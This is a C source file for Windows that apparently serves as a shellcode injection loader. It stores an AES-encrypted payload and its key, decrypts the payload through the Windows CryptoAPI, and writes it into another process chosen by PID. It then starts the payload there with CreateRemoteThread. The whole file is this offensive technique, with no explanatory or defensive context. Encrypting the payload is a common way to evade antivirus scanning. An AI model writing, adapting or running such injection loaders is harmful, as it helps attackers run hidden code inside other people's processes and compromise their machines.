#include <Windows.h>
#include <stdio.h>

#pragma comment (lib, "crypt32.lib")

#undef DEBUG

unsigned char payload[] = { 0x9b, 0x69, 0x73, 0x1c, 0x6b, 0xd8, 0x92, 0xd5, 0x87, 0x3, 0xd1, 0xe9, 0x55, 0x29, 0x85, 0xc6, 0x46, 0xed, 0x9b, 0x2d, 0x98, 0x7b, 0x23, 0xd6, 0x3d, 0x75, 0x19, 0xfd, 0xab, 0x64, 0x8e, 0xe8, 0xbd, 0xd4, 0x27, 0x75, 0x3d, 0xaa, 0xec, 0xa2, 0xc9, 0xbc, 0xe5, 0xb5, 0xcc, 0x85, 0xa6, 0x41, 0xd7, 0xfb, 0x5f, 0x39, 0x2e, 0xb0, 0x1c, 0xec, 0x62, 0xd0, 0xc5, 0xad, 0x50, 0xe2, 0xe5, 0x80, 0x43, 0xfb, 0x5d, 0xe4, 0xb3, 0xee, 0xcb, 0x9f, 0x97, 0xfc, 0x13, 0x76, 0x33, 0x8, 0x58, 0x3a, 0x2b, 0xf9, 0xeb, 0x4f, 0xb3, 0x55, 0x6b, 0x1b, 0x42, 0x62, 0x3d, 0x13, 0xd9, 0x5c, 0xc6, 0x26, 0x64, 0x2, 0xf0, 0xa3, 0xde, 0x83, 0x9, 0x6f, 0x67, 0x1, 0xf5, 0x77, 0xcb, 0xe8, 0xc1, 0x7a, 0x2a, 0x36, 0x2, 0x72, 0xab, 0x5f, 0x25, 0xf4, 0x9b, 0xad, 0x71, 0x7, 0xeb, 0x6b, 0x83, 0xe4, 0x75, 0x5, 0xbd, 0x96, 0x8c, 0xec, 0x4, 0x83, 0x6c, 0xfc, 0xad, 0xc4, 0x21, 0xd0, 0xd4, 0xc5, 0xee, 0x70, 0x8, 0x39, 0x8a, 0x5d, 0x28, 0xcb, 0x7b, 0xe3, 0x33, 0x1f, 0xd2, 0x5f, 0x61, 0xaa, 0x25, 0x0, 0xcc, 0x64, 0x44, 0xe6, 0xfb, 0x47, 0xce, 0xd5, 0x31, 0x42, 0x41, 0xeb, 0x2, 0x0, 0x15, 0x36, 0xe7, 0x91, 0xf1, 0x2d, 0xc4, 0xef, 0x7f, 0xef, 0x4e, 0xb6, 0xeb, 0x53, 0xd3, 0x47, 0xdd, 0x3f, 0x8d, 0x1, 0x6b, 0xb5, 0x2e, 0x39, 0xcb, 0x1, 0x5a, 0xd, 0xd3, 0xae, 0x1a, 0x25, 0xe, 0xfc, 0x1e, 0xc5, 0x34, 0xea, 0xe1, 0x90, 0x9d, 0x5f, 0x11, 0xf, 0xa3, 0x1, 0x51, 0x58, 0x87, 0xb3, 0xf5, 0x3a, 0xcf, 0xe6, 0xf, 0xfa, 0x24, 0x1f, 0xd2, 0x97, 0x16, 0x63, 0xaf, 0x5a, 0xc6, 0xf9, 0x36, 0x90, 0x6d, 0x23, 0x93, 0x70, 0x96, 0xbf, 0x70, 0x31, 0xdf, 0xa3, 0xf0, 0x2a, 0x1d, 0x40, 0x62, 0x3b, 0xf7, 0xc1, 0x32, 0x3a, 0x25, 0x54, 0xf2, 0x6d, 0x1, 0x54, 0x8e, 0x77, 0xcb, 0xce, 0x56, 0x48, 0x4, 0xdc, 0xbc, 0x48, 0x50, 0x69, 0x50, 0xd4, 0xdd, 0x8, 0x9, 0xf9, 0x90, 0x1d, 0xe1, 0xc7, 0x11, 0x4e, 0xcc, 0x7f, 0x8, 0xa3, 0xb8, 0xe, 0xa8, 0xa7, 0x86, 0x3e, 0x3, 0x14, 0xa0, 0x35, 0xf5, 0x83, 0xc3, 0xd8, 0x5b, 0x10, 0x85, 0x19, 0xd2, 0xd7, 0xc0, 0x47, 0x66, 0x3d, 0x4a, 0x61, 0xaf, 0x1b, 0xe2, 0xc, 0x9d, 0x2f, 0x1b, 0x29, 0x49, 0xee, 0x1d, 0xed };
unsigned char key[] = { 0xf1, 0x4a, 0x33, 0x83, 0x2, 0x71, 0x73, 0xcb, 0x41, 0xa6, 0x40, 0xc8, 0xce, 0x98, 0x70, 0x69 };

unsigned int payload_len = sizeof(payload);

int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen);

int main(int argc, const char* argv[])
{
    if (argc < 2) {
        printf("not enough parameter\n");
        return 0;
    }
 
    int pid = atoi(argv[1]);
 
    HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, pid);
 
    if (!hProcess) {
        printf("Error opening Process");
        return 0;
    }
 
    void* buffer = VirtualAllocEx(hProcess, NULL, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
    if (!buffer) {
        printf("Failed create buffer");
        return 0;
    }
 
	AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));
 
    if (!WriteProcessMemory(hProcess, buffer, payload, payload_len, NULL)) {
        printf("Failed to write memory");
        return 0;
    }
 
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);
 
    if (!hThread) {
        printf("Cannot start remote thread");
        return 0;
    }
    return 0;
}

int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}